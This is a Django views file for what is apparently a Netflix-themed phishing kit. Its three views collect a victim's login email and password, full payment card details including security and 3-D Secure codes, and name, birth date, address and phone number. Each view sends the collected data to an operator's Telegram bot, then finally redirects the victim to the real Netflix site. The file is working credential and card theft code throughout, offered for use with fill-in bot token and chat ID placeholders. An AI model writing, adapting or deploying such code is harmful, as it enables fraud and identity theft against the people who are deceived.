from django.shortcuts import redirect, render
import requests
import datetime
from django.views.decorators.csrf import csrf_exempt
# Create your views here.

@csrf_exempt
def login(request):
    if request.method == 'POST':
        userName = request.POST["username"]
        password = request.POST["password"]
        print(request.POST)
        payload = f"""|---> New Login Log <---|
------------------------------------
Login Time : {datetime.datetime.now()}
------------------------------------
Email Or Num : {userName}
Password : {password}
------------------------------------"""
        # Enter Your Number ID Here
        NUMBER_ID = "<NUMBER_ID>"
        
        # Enter Your Bot Token Here
        TOKEN = "<BOT_TOKEN>"
        
        # send payload
        post = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={NUMBER_ID}&text={payload}"
        
        requests.post(post)
        
        return redirect('/login/dashboard/step1/')
    
    return render(request, "base/login.html")


@csrf_exempt
def dashboard(request):
    if request.method == 'POST':
        print(request.POST)
        Name = request.POST["username"]
        CC_number = request.POST["number"]
        exDate = request.POST["exDate"]
        secCode = request.POST["secCode"]
        threeDCode = request.POST["threeDSecure"]
        payload = f"""|---> New CC Log <---|
------------------------------------
Time : {datetime.datetime.now()}
------------------------------------
Name On Card : {Name}
Card Number : {CC_number}
Expiration Date : {exDate}
Security Code : {secCode}
3D-Secure : {threeDCode}
------------------------------------"""
        # Enter Your Number ID Here
        NUMBER_ID = "<NUMBER_ID>"
        
        # Enter Your Bot Token Here
        TOKEN = "<BOT_TOKEN>"
        
        # send payload
        post = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={NUMBER_ID}&text={payload}"
        
        requests.post(post)
        return redirect('/login/dashboard/step2/')
    
    return render(request, "base/dashboard_step1.html")
    

@csrf_exempt    
def dashboard2(request):
    if request.method == 'POST':
        print(request.POST)
        FirstName = request.POST["FirstName"]
        LastName = request.POST["LastName"]
        DateOfBirth = request.POST["Date_Of_Birth"]
        Address = request.POST["Address"]
        City = request.POST["City"]
        State = request.POST["State"]
        Zip_Code = request.POST["Zip_Code"]
        Phone_Number = request.POST["Phone_Number"]
        payload = f"""|---> New Person Log <---|
------------------------------------
Time : {datetime.datetime.now()}
------------------------------------
First Name : {FirstName}
Last Name : {LastName}
Date Of Birth : {DateOfBirth}
Address : {Address}
City : {City}
State : {State}
Zip_Code : {Zip_Code}
Phone_Number : {Phone_Number}
------------------------------------"""
        # Enter Your Number ID Here
        NUMBER_ID = "<NUMBER_ID>"
        
        # Enter Your Bot Token Here
        TOKEN = "<BOT_TOKEN>"
        
        # send payload
        post = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={NUMBER_ID}&text={payload}"
        
        requests.post(post)
        return redirect('https://www.netflix.com/')
    
    return render(request, "base/dashboard_step2.html")